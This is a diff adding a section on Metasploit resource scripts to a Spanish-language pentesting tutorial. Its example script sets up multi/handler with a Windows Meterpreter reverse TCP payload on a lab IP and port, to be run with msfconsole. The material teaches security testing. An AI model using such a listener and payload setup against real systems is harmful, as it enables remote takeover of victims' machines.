@@ -175,3 +175,27 @@ Cambiar de workspace:
 ```bash
 msf > workspace <nombre>
 ```
+
+# 6. Automatización con Resource Scripts
+
+Los Resource Scripts de Metasploit son una funcionalidad de MSF que permite automatizar tareas y comandos repetitivos. Funcionan de forma similar a los batch scripts (`.bat` o `.cmd`), ya que permiten especificar un conjunto de comandos de msfconsole que se ejecutarán de manera secuencial.
+
+Podemos cargar el script desde msfconsole y automatizar la ejecución de los comandos que hayamos definido en el Resource Script y podemos utilizarlos para automatizar diferentes tareas, como la configuración de multi/handler y la carga y ejecución de payloads.
+
+Ejemplo:
+
+```bash
+
+
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lport 1234
+set lhost 10.125.84.23
+run
+```
+
+Lo podemos ejecutar, despues de guardarlo como `script.rc`, con:
+
+```bash
+msfconsole -r script.rc
+```
